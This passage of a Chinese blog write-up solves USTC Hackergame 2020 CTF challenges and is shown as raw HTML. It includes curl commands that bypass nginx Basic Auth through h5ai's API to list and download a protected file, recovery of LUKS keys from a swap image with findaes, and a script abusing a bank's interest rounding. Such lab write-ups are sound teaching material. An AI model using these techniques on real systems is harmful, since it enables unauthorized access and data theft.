href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 